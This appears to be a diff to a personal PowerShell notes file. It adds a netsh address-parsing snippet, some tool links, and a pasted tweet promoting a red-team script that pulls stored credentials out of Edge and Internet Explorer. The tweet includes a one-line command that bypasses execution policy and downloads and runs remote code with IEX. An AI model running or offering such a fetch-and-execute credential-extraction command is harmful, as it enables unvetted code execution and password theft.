@@ -1,5 +1,13 @@
 
 <#
+https://www.fosshub.com/IrfanView.html/iview451_plugins_x64_setup.exe
+
+Just wrote a little (3 Lines 🤣)script to extract stored credentials from Edge && IE
+Code: https://t.co/dOJIw7DjNW
+Usage: powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://t.co/0sIMOcEfb9’)"
+#infosec #pentest #redteam https://t.co/gOTKzBPQNE (https://twitter.com/HanseSecure/status/988377489994022912?s=03)
+
+https://github.com/kirillkovalenko/nssm
 
 DeDuplicate History
 (gc $PSHistory | measure) | Select count 
@@ -1163,6 +1171,22 @@ ExitSub:
   Set objSelection = Nothing
   Set objOL = Nothing
 End Sub
+
+$Interface = [ordered]@{}; 
+netsh interface IPv4 show address | Where-Object { $_.trim() } | ForEach-Object { 
+  If ($_ -match '^Config.*"(.*)"') { 
+    '{0,-16} {1}' -f 'Name', $Matches[1] 
+  } else { 
+    $Fields = $_ -replace '(mask)?[)\s]+' -split '[:(/]'; 
+    If ($Fields.Count -eq 2) { 
+      '{0,-16} {1}' -f $Fields[0],$Fields[1] 
+    } ElseIf ($Fields.Count -eq 4) { 
+      '{0,-16} {1}' -f 'Subnet',     $Fields[1]; 
+      '{0,-16} {1}' -f 'CIDR',       $Fields[2];
+      '{0,-16} {1}' -f 'SubNetMask', $Fields[3] 
+    }
+  }  
+}
 
 
 Windows 10 Security Technical Implementation Guide
